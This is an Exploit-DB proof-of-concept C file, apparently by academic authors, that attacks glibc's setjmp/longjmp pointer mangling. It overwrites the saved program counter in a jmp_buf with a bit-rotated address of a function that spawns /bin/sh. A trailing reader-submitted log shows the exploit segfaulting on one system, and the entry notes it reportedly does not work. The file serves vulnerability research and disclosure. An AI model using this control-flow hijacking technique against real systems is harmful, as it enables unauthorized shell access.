/*
 *
 * Exploit-DB Note: Reportedly does not work. See output at the bottom of the entry.
 *
 * $FILE: bug-mangle.c
 *
 * Comment: Proof of concept
 *
 * $VERSION$
 *
 * Author: Hector Marco <hecmargi@upv.es>
 *         Ismael Ripoll <iripoll@disca.upv.es>
 *
 * $LICENSE:
 * This program is free software; you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation; either version 2 of the License, or
 * (at your option) any later version.
 *
 * This program is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License
 * along with this program; if not, write to the Free Software
 * Foundation, Inc., 59 Temple Place - Suite 330, Boston, MA 02111-1307, USA.
 */

#include <stdio.h>
#include <setjmp.h>
#include <stdint.h>
#include <limits.h>

#ifdef __i386__
   #define ROTATE 0x9
   #define PC_ENV_OFFSET 0x14
#elif __x86_64__
   #define ROTATE 0x11
   #define PC_ENV_OFFSET 0x38
#else
   #error The exploit does not support this architecture
#endif

unsigned long rol(uintptr_t value) {
   return (value << ROTATE) | (value >> (__WORDSIZE - ROTATE));
}

int hacked(){
   printf("[+] hacked !!\n");
   system("/bin/sh");
}

int main(void){
   jmp_buf env;
   uintptr_t *ptr_ret_env = (uintptr_t*) (((uintptr_t) env) + PC_ENV_OFFSET);

   printf("[+] Exploiting ...\n");
   if(setjmp(env) == 1){
      printf("[-] Exploit failed.\n");
      return 0;
   }

   /*Overwrie env return address */
   *ptr_ret_env = rol((uintptr_t)hacked);

   longjmp(env, 1);

   printf("[-] Exploit failed.\n");
   return 0;
}

####################################################################################################################
#
# Reader submitted results
/*

[522] user@his-system ~ $ ./POC
[+] Exploiting ...
Segmentation fault
[523] user@his-system ~ $ ldd POC
linux-vdso.so.1 => (0x00007fffab5fd000)
libc.so.6 => /lib64/libc.so.6 (0x0000003269800000)
/lib64/ld-linux-x86-64.so.2 (0x0000003269400000)
[525] user@his-system ~ $ uname -a
Linux his-sysrtem.domain.LOCAL 2.6.18-348.12.1.el5xen #1 SMP Mon Jul 1 17:58:32 EDT 2013 x86_64 x86_64 x86_64 GNU/Linux
[526] user@his-system ~ $

[526] user@his-system ~ $ grep vsys /proc/self/maps
ffffffffff600000-ffffffffffe00000 ---p 00000000 00:00 0 [vsyscall]
ffffffffff600000-ffffffffffe00000 ---p 00000000 00:00 0 [vsyscall]

*/